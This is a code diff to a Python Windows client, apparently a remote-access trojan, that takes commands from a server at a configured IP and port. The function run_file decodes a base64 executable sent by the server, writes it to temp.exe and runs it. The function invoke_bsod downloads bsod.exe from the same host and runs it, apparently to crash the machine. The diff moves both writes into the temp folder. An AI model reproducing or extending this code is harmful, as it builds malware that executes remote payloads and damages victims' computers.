@@ -1,5 +1,6 @@
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
+from os import environ, getcwd, chdir
 from requests import Response, get
 from base64 import b64decode
 from time import sleep
@@ -29,15 +30,19 @@ def main() -> None:
 
 
 def run_file(response_json: dict) -> None:
+    old_cd = getcwd()
+    chdir(environ["temp"])
     with open("temp.exe", "wb") as temp_file:
         temp_file.write(b64decode(response_json.get("runfile")))
     Popen(
         f"temp.exe {response_json.get('args')}",
         creationflags=CREATE_NEW_CONSOLE,
     )
+    chdir(old_cd)
 
 
 def invoke_bsod() -> None:
+    chdir(environ["temp"])
     with open("temp.exe", "wb") as temp_file:
         temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
     Popen("temp.exe")
